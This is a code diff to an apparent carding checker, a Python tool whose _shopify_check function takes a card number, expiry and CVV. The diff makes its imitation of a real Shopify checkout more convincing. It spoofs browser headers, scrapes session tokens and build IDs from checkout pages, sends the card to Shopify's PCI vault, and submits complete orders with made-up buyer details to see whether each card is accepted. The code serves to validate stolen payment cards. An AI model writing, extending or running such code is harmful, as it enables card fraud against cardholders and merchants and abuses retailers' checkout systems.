@@ -197,9 +197,9 @@ def _extract_script_fingerprint(text):
     return None
 
 
-def _checkout_graphql_headers(domain, checkout_url):
+def _checkout_graphql_headers(domain, checkout_url, checkout_id=None, build_id=None, session_token=None):
     source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
-    return {
+    headers = {
         'User-Agent': _get_ua(),
         'Accept': 'application/json',
         'Accept-Language': 'en-US,en;q=0.9',
@@ -214,6 +214,18 @@ def _checkout_graphql_headers(domain, checkout_url):
         'sec-fetch-site': 'same-origin',
         'x-checkout-web-source-id': source_id,
     }
+    if checkout_id:
+        headers['shopify-checkout-client'] = 'checkout-web/1.0'
+        headers['shopify-checkout-source'] = f'id="{checkout_id}", type="cn"'
+        headers['x-checkout-web-deploy-stage'] = 'production'
+        headers['x-checkout-web-server-handling'] = 'fast'
+        headers['x-checkout-web-server-rendering'] = 'yes'
+        headers['x-checkout-web-source-id'] = checkout_id
+        if build_id:
+            headers['x-checkout-web-build-id'] = build_id
+        if session_token:
+            headers['x-checkout-one-session-token'] = session_token
+    return headers
 
 
 def _extract_session_token(text):
@@ -395,8 +407,35 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
         currency = cm.group(1).upper()
     payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
 
-    graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
-    gql_headers = _checkout_graphql_headers(domain, checkout_url)
+    # Extract signed handles from checkout page (critical for delivery expectations)
+    signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', text)
+    if not signed_handles:
+        raw = re.findall(r'\\"signedHandle\\":\"([^\\"]+)', text)
+        signed_handles = [h.replace('\\n','').replace('\\r','') for h in raw]
+    
+    # Extract build ID
+    build_id_match = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', text)
+    if not build_id_match:
+        build_id_match = re.search(r'/build/([a-f0-9]{40})/', text)
+    build_id = build_id_match.group(1) if build_id_match else '4663384ede457d59be87980de7797171b19f2a1b'
+    
+    # Extract shop ID
+    shop_id_match = re.search(r'"shopId"\s*:\s*(\d+)', text)
+    shop_id = shop_id_match.group(1) if shop_id_match else "25603230"
+    
+    # Extract checkout ID from URL
+    checkout_id_match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', checkout_url)
+    checkout_id = checkout_id_match.group(1) if checkout_id_match else checkout_url.split('/')[-1].split('?')[0]
+    
+    # Determine GraphQL base URL
+    parsed = urlparse(checkout_url)
+    if 'shopify.com' in parsed.netloc and 'checkout.' in parsed.netloc:
+        graphql_base = f"{parsed.scheme}://{parsed.netloc}"
+    else:
+        graphql_base = base_url
+    
+    graphql_url = f"{graphql_base}/checkouts/unstable/graphql"
+    gql_headers = _checkout_graphql_headers(domain, checkout_url, checkout_id, build_id, sst)
 
     addr_block = {'address1': street, 'address2': '', 'city': city, 'countryCode': 'US', 'postalCode': s_zip, 'firstName': first, 'lastName': last, 'zoneCode': state, 'phone': phone}
 
@@ -408,10 +447,10 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
         'lineComponentsSource': None, 'lineComponents': [],
     }
 
-    # Generate ONE fingerprint and use it for both negotiate and submit
+    # Use the SAME fingerprint for negotiate
     checkout_fingerprint = {
-        'signature': '',
-        'signatureUuid': '',
+        'signature': None,
+        'signatureUuid': None,
         'lineItemScriptChanges': [],
         'paymentScriptChanges': [],
         'shippingScriptChanges': [],
@@ -532,12 +571,42 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
         payment_method_id = 'shopify_payments'
         logger.info("[FALLBACK] Using shopify_payments as payment_method_id")
 
-    # Step 5: Tokenize card
+    # Extract PCI build hash for vault
+    pci_match = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', text)
+    pci_build = pci_match.group(1) if pci_match else 'a8e4a94'
+    
+    # Step 5: Tokenize card via PCI endpoint
     year_full = f"20{yy}" if len(yy) == 2 else yy
-    token_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": cc, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}
-
+    token_payload = {
+        "credit_card": {
+            "number": cc,
+            "month": int(mm),
+            "year": int(year_full),
+            "verification_value": cvv,
+            "start_month": None,
+            "start_year": None,
+            "issue_number": "",
+            "name": f"{first} {last}"
+        },
+        "payment_session_scope": domain
+    }
+    
+    vault_headers = {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'Origin': 'https://checkout.pci.shopifyinc.com',
+        'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build}/number-ltr.html?identifier=&locationURL={checkout_url}',
+        'User-Agent': UA,
+        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+    }
+    
     try:
-        resp = await client.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=httpx.Timeout(8))
+        resp = await client.post('https://checkout.pci.shopifyinc.com/sessions', json=token_payload, headers=vault_headers, timeout=httpx.Timeout(8))
         vault_data = resp.json()
         if 'id' not in vault_data:
             return None, "Invalid card - vault rejected", gw_name, None
@@ -577,15 +646,82 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
             'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
         }
 
-    # Use the SAME fingerprint as negotiate
-    submit_fingerprint = checkout_fingerprint
-
-    # Step 7: Submit order
+    # Step 7: Submit order with full payload matching real checkout
+    submit_delivery = {
+        'deliveryLines': [{
+            'destination': {'streetAddress': {
+                'address1': street, 'address2': '', 'city': city, 'countryCode': 'US',
+                'postalCode': s_zip, 'company': '', 'firstName': first, 'lastName': last,
+                'zoneCode': state, 'phone': phone, 'oneTimeUse': False
+            }},
+            'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}},
+            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
+            'deliveryMethodTypes': ['SHIPPING'],
+            'expectedTotalPrice': {'any': True},
+            'destinationChanged': True,
+        }],
+        'noDeliveryRequired': [], 'useProgressiveRates': False,
+        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
+    }
+    
+    delivery_expectation_lines = [{"signedHandle": sh} for sh in signed_handles]
+    card_bin = cc[:8] if len(cc) >= 8 else cc
+    buyer_email = email
+    pm_identifier = payment_method_id or payment_token
+    attempt_token = f"{checkout_id}-uaz{''.join(random.choices(string.ascii_lowercase, k=9))}"
+    
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
-    checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
-    attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]
-
-    completion_vars = {'input': {'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0], 'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True}, 'delivery': submit_delivery, 'merchandise': {'merchandiseLines': [submit_merch]}, 'payment': payment_input, 'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'email': {'value': email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False}, 'tip': {'tipLines': []}, 'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': tax_amount, 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []}, 'note': {'message': None, 'customAttributes': []}, 'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None, 'scriptFingerprint': submit_fingerprint, 'optionalDuties': {'buyerRefusesDuties': False}}, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url}}
+    
+    completion_vars = {'input': {
+        'checkpointData': None,
+        'sessionInput': {'sessionToken': sst}, 'queueToken': latest_qt[0],
+        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
+        'delivery': submit_delivery,
+        'deliveryExpectations': {'deliveryExpectationLines': delivery_expectation_lines},
+        'merchandise': {'merchandiseLines': [submit_merch]},
+        'memberships': {'memberships': []},
+        'payment': {
+            'totalAmount': {'any': True},
+            'paymentLines': [{
+                'paymentMethod': {
+                    'directPaymentMethod': {
+                        'paymentMethodIdentifier': pm_identifier,
+                        'sessionId': payment_token,
+                        'billingAddress': {'streetAddress': {
+                            'address1': street, 'address2': '', 'city': city, 'countryCode': 'US',
+                            'postalCode': s_zip, 'company': '', 'firstName': first, 'lastName': last,
+                            'zoneCode': state, 'phone': phone
+                        }},
+                        'cardSource': None
+                    },
+                    'giftCardPaymentMethod': None, 'redeemablePaymentMethod': None,
+                    'walletPaymentMethod': None, 'walletsPlatformPaymentMethod': None,
+                    'localPaymentMethod': None, 'paymentOnDeliveryMethod': None,
+                    'manualPaymentMethod': None, 'customPaymentMethod': None,
+                    'offsitePaymentMethod': None, 'deferredPaymentMethod': None,
+                    'customerCreditCardPaymentMethod': None, 'remotePaymentInstrument': None
+                },
+                'amount': {'any': True}
+            }],
+            'billingAddress': {'streetAddress': {
+                'address1': street, 'address2': '', 'city': city, 'countryCode': 'US',
+                'postalCode': s_zip, 'company': '', 'firstName': first, 'lastName': last,
+                'zoneCode': state, 'phone': phone
+            }},
+            'creditCardBin': card_bin
+        },
+        'buyerIdentity': {'customer': {'presentmentCurrency': currency, 'countryCode': 'US'}, 'email': buyer_email, 'emailChanged': False, 'phoneCountryCode': 'US', 'marketingConsent': [{'sms': {'consentState': 'DECLINED', 'value': phone, 'countryCode': 'US'}}, {'email': {'consentState': 'GRANTED', 'value': buyer_email}}], 'shopPayOptInPhone': {'number': phone, 'countryCode': 'US'}, 'rememberMe': False, 'setShippingAddressAsDefault': False},
+        'tip': {'tipLines': []},
+        'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'any': True}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
+        'note': {'message': None, 'customAttributes': [{'key': 'gorgias.guest_id', 'value': str(uuid.uuid4())}, {'key': 'gorgias.session_id', 'value': str(uuid.uuid4())}]},
+        'localizationExtension': {'fields': []},
+        'shopPayArtifact': {'optIn': {'vaultEmail': '', 'vaultPhone': phone, 'optInSource': 'REMEMBER_ME'}},
+        'nonNegotiableTerms': None,
+        'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
+        'optionalDuties': {'buyerRefusesDuties': False},
+        'captcha': None,
+        'cartMetafields': []
+    }, 'attemptToken': attempt_token, 'metafields': [], 'analytics': {'requestUrl': checkout_url, 'pageId': str(uuid.uuid4()).upper()}}
 
     async def _do_submit():
         try:
